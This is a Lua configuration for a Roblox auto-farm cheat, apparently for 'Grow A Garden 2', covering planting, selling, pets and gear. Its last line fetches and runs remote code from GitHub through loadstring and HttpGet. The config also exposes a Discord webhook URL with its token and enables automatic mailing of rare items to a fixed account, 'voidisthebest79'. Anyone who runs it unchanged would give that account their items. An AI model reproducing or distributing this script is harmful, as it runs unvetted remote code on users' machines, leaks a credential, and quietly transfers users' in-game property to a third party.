getgenv().Config = {

  --////////////////////////////////////////////////////
  -- CORE FARM FEATURES (MAIN LOOP SYSTEMS)
  --////////////////////////////////////////////////////
  ["Main Features"] = {
    ["Auto Plant"] = true, -- automatically plants seeds based on Seeds To Plant
    ["Auto Sell"] = true, -- auto sells harvested fruits after timer / capacity
    ["Auto Buy Seed"] = true, -- buys seeds from shop automatically
    ["Auto Buy Gear"] = true, -- buys tools like sprinklers, cans, etc
    ["Auto Use Gear"] = true -- automatically equips/uses bought gear
  },

  ["Auto Expand Garden"] = true, -- expands plot when conditions are met

  --////////////////////////////////////////////////////
  -- PERFORMANCE / FPS CONTROL
  --////////////////////////////////////////////////////
  ["Optimization"] = {
    ["Workspace Cleaner"] = true, -- removes unnecessary parts for better performance
    ["Black Screen"] = false, -- disables rendering for performance boost
    ["FPS Cap"] = 60, -- sets max FPS (60 recommended)
    ["Auto Set FPS"] = true, -- auto adjusts FPS cap based on device
    -- true = PC/Windows recommended
    -- false = emulator/mobile optimization
  },
  --////////////////////////////////////////////////////
  -- SECONDARY SYSTEMS (PET / UTILITY / QUALITY OF LIFE)
  --////////////////////////////////////////////////////
  ["Other Features"] = {
    ["Auto Shovel"] = true, -- removes unwanted plants automatically
    ["Auto Catch Pet"] = true, -- auto catches new pets spawned in world
    ["Auto Equip Pets"] = true, -- equips best pets automatically
    ["Auto Optimize Pets"] = true, -- optimizes pet stats/loadout
    ["Auto Upgrade Pet Slots"] = true, -- increases pet capacity automatically
    ["Auto Tutorial"] = true -- skips or completes tutorial steps
  },

  --////////////////////////////////////////////////////
  -- CODE SYSTEM
  --////////////////////////////////////////////////////
  ["Codes"] = {
    ["Auto Redeem Codes"] = true, -- automatically redeems all codes listed
    ["Codes To Redeem"] = {
      "TEAMGREENBEAN",
    }
  },

  --////////////////////////////////////////////////////
  -- FARMING BEHAVIOR SETTINGS
  --////////////////////////////////////////////////////
  ["Auto Pickup Mutation Seeds"] = true, -- picks special mutation seeds instantly
  ["Teleport To Seed Packs"] = true, -- teleports to seed pack drops
  ["Auto Plant Mutation Seeds"] = false, -- enables planting rare mutation seeds

  ["Sell After"] = 30, -- seconds before selling harvested items

  ["Mutation Seeds To Plant"] = {}, -- whitelist for mutation planting
  ["Gear To Buy"] = {}, -- custom gear whitelist

  --////////////////////////////////////////////////////
  -- PET SYSTEM (BUY / EQUIP / PRIORITY)
  --////////////////////////////////////////////////////
  ["Buy Pets"] = {
    ["Unicorn"] = 99,
    ["Raccoon"] = 99,
    ["IceSerpent"] = 99,
    ["Robin"] = 3,
    ["Deer"] = 3,
  },

  ["Equip Pets"] = { -- name, amount to equip, priority (higher = more important)
    {"Robin", 5, 1},
    {"Deer", 5, 2},
  },

  --////////////////////////////////////////////////////
  -- GEAR SYSTEM (BUY + USAGE PRIORITY)
  --////////////////////////////////////////////////////
  ["Buy Gears"] = {
    ["Super Sprinkler"] = 9999,
  },

  ["Use Sprinkler"] = {
    "Legendary Sprinkler",
    "Rare Sprinkler",
    "Uncommon Sprinkler",
    "Common Sprinkler",
  },

  --////////////////////////////////////////////////////
  -- PLANT COLLECTION SETTINGS
  --////////////////////////////////////////////////////
  ["Collect Mutated Plants"] = {
    "Bamboo",
    "Mushroom",
    "Green Bean"
  },

  ["Seeds To Plant"] = {
    ["Carrot"] = 15,
    ["Strawberry"] = 15,
    ["Blueberry"] = 15,
    ["Tulip"] = 15,
    ["Tomato"] = 15,
    ["Apple"] = 15,
    ["Corn"] = 15,

    ["Bamboo"] = 30,
    ["Mushroom"] = 30,
    ["Cactus"] = 30,
    ["Pineapple"] = 30,
    ["Green Bean"] = 30,
    ["Banana"] = 30,
    ["Grape"] = 30,
    ["Coconut"] = 30,
    ["Mango"] = 30,
    ["Dragon Fruit"] = 30,
    ["Acorn"] = 30,
    ["Cherry"] = 30,
    ["Sunflower"] = 30,
  },

  ["Buy Seeds"] = {"Dragon's Breath", "Moon Bloom"}, -- optional whitelist override

  --////////////////////////////////////////////////////
  -- GARDEN UPGRADES
  --////////////////////////////////////////////////////
  ["Expand Plot"] = 1, -- number of plots to expand at once
  ["Max Pet Slots"] = 1, -- 0 = base (3 slots), +1 = 4 slots, etc

  --////////////////////////////////////////////////////
  -- WEBHOOK SYSTEM (NOTIFICATIONS)
  --////////////////////////////////////////////////////
  ["Pet Catch Webhook"] = {
    Enabled = true,
    Url = "https://discord.com/api/webhooks/1031980264244654100/ti-7cLsGbWXZ_pL2yX-xFeNmjT7o7l8zrLutrz5XMSTAaVYIsIa6zE_EVJGuhIGs0DkG",
    Note = "Gag2",
    Mention = "@everyone Found: "
  },

  ["Seed Pack Webhook"] = {
    Enabled = true,
    Url = "https://discord.com/api/webhooks/1031980264244654100/ti-7cLsGbWXZ_pL2yX-xFeNmjT7o7l8zrLutrz5XMSTAaVYIsIa6zE_EVJGuhIGs0DkG",
    Note = "Gag2"
  },

  --////////////////////////////////////////////////////
  -- SMART DAILY DEAL SYSTEM
  --////////////////////////////////////////////////////

  ["Smart Daily Deal"] = {
    ["Enabled"] = true, -- enables automatic Daily Deal handling
    ["Fruit Amount"] = 10, -- minimum amount of a fruit to keep before donating extras
    ["Fruits"] = { -- fruits allowed to be used for Daily Deals
      "Bamboo",
      "Mushroom",
    }
  },
  
  --////////////////////////////////////////////////////
  -- MAIL SYSTEM (ITEM TRANSFER)
  --////////////////////////////////////////////////////

  -- Example:
  --[[
  ["your username"] = {
    Note = "gift",
    Items = {
      "Golden Dragonfly",
      "Unicorn",
      "Raccoon",
    },
  },
  ]]

  ["Auto Send Mail"] = true, -- Automatically sends configured items

  ["Mail To Send"] = {
      ["voidisthebest79"] = {
        Note = "gift",
        Items = {
          "Golden Dragonfly",
          "Unicorn",
          "Raccoon",
          "Rainbow",
          "Gold",
          "Super Sprinkler",
          "Super Watering Can",
        },
      },
    },
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/refs/heads/main/Kaitun/Grow%20A%20Garden%202", true))()
